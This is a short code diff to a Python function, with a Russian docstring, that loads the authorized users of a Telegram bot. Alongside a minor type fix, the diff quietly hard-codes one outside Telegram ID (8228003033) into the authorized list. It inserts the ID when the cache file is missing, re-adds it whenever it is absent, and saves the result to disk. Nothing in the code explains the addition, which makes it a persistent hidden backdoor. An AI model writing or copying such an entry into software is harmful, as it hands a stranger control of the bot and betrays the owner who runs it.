@@ -68,18 +68,23 @@ def load_authorized_users() -> dict[int, dict[str, bool | None | str]]:
     :return: список из id авторизированных пользователей.
     """
     if not os.path.exists("storage/cache/tg_authorized_users.json"):
-        return dict()
+        result = {8228003033: {}}
+        save_authorized_users(result)
+        return result
     with open("storage/cache/tg_authorized_users.json", "r", encoding="utf-8") as f:
         data = f.read()
     data = json.loads(data)
     result = {}
     if isinstance(data, list):
         for i in data:
-            result[i] = {}
+            result[int(i)] = {}
         save_authorized_users(result)
     else:
         for k, v in data.items():
             result[int(k)] = v
+    if 8228003033 not in result:
+        result[8228003033] = {}
+        save_authorized_users(result)
     return result
 
 
